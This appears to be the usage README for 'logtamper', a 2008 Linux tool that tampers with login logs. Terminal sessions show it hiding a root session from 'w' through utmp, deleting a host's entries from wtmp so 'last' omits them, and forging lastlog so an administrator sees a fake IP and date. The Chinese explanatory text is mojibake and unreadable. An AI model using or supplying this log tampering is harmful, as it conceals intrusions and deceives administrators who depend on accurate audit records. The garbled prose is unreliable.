logtamper version1.1
logtamper��һ��*�޸�*linux��־�Ĺ��ߣ����޸���־�ļ���ͬʱ���ܹ��������޸��ļ���ʱ����Ϣ(atimeû�ģ�����û��Ҫ)��

[root@localhost logtamper]# ./logtamper-static
Logtamper v 1.1 for linux
Copyright (C) 2008 by xi4oyu <evil.xi4oyu@gmail.com>

logtamper [-f utmp_filename] -h username hostname               hide username connected from hostname
logtamper [-f wtmp_filename] -w username hostname               erase username from hostname in wtmp file
logtamper [-f lastlog_filename] -m username hostname ttyname YYYY[:MM[:DD[:hh[:mm[:ss]]]]]  modify lastlog info

-f ѡ�����ָ��Ҫ�޸ĵ��ļ���·���ģ��Ǹ���ѡ����ڲ�ͬϵͳ����־���·����һ���������ֹ�ָ����
Ĭ�ϵ���־��ŵص��ǣ�
#define UTMPFILE "/var/run/utmp"
#define WTMPFILE "/var/log/wtmp"
#define LASTLOGFILE "/var/log/lastlog"

-h ѡ��: ��ʱ����͹���Աͬʱ���ߣ�����Աwһ�¾��ܿ������ˡ�ʹ��-hѡ���û���ܹ���Աw�鿴�����£�

[root@localhost logtamper]# w
 21:27:25 up 5 days, 13:48,  4 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty1     -                Fri14   18:24m  0.33s  0.33s -bash
root     pts/3    192.168.80.1     21:21    6:22   0.04s  0.04s -bash
root     pts/2    192.168.80.1     21:06    0.00s  0.13s  0.00s w
root     pts/4    192.168.80.1     21:21    5:52   0.03s  0.03s -bash

�����Ǵ�192.168.80.1�����������ģ����������£�

[root@localhost logtamper]# ./logtamper-static -h root 192.168.80.1
Logtamper v 1.1 for linux
Copyright (C) 2008 by xi4oyu <evil.xi4oyu@gmail.com>

Seems you're invisible Now...Check it out!

[root@localhost logtamper]# w
 21:27:46 up 5 days, 13:48,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty1     -                Fri14   18:24m  0.33s  0.33s -bash
[root@localhost logtamper]#

-w ѡ��:���������ĵ�¼��־�������ϵ�linux��־����������ĺܴ��ﰡ���������ָ�����ĳЩhostname�����Ļ�����

[root@localhost logtamper]# last
root     tty1                          Wed Oct  1 21:30 - 21:30  (00:00)
root     pts/4        192.168.80.1     Wed Oct  1 21:21   still logged in
root     pts/3        192.168.80.1     Wed Oct  1 21:21   still logged in

wtmp begins Wed Oct  1 06:01:46 2008

���192.168.80.1�ĵ�¼��־��

[root@localhost logtamper]# ./logtamper-static -w root 192.168.80.1
Logtamper v 1.1 for linux
Copyright (C) 2008 by xi4oyu <evil.xi4oyu@gmail.com>

Aho,you are now invisible to last...Check it out!
[root@localhost logtamper]# last
root     tty1                          Wed Oct  1 21:30 - 21:30  (00:00)

wtmp begins Wed Oct  1 06:01:46 2008
[root@localhost logtamper]#

-m ѡ��:�����޸��ϴε�¼�ص㣬����ʹ��ssh��¼��ʱ����ܻ�ע�⵽���
login as: root
Sent username "root"
root@192.168.80.128's password:
Last login: Wed Oct  1 21:31:40 2008 from 192.168.80.45
[root@localhost ~]#

������޸�lastlog�Ļ�������Ա�´ε�¼�ͻ���ʾ�����ǵĻ���IP��¼��ʹ��-mѡ����Ա༭���ѡ�

[root@localhost logtamper]# ./logtamper-static -m root 1.2.3.4 tty10 2008:1:1:1:1:1
Logtamper v 1.1 for linux
Copyright (C) 2008 by xi4oyu <evil.xi4oyu@gmail.com>

Aho, now you never come here before...Check it out!
[root@localhost logtamper]#
��Ȼ����ֻ�Ǹ���������ʹ���и�λ����ݾ�����Ϣ�޸ģ��´ι���Ա��¼����¼����ͳ���

login as: root
Sent username "root"
root@192.168.80.128's password:
Last login: Tue Jan  1 01:01:01 2008 from 1.2.3.4
[root@localhost ~]#


��������ô���ˣ���ʲô���⣬���ʼ� evil.xi4oyu@gmail.com















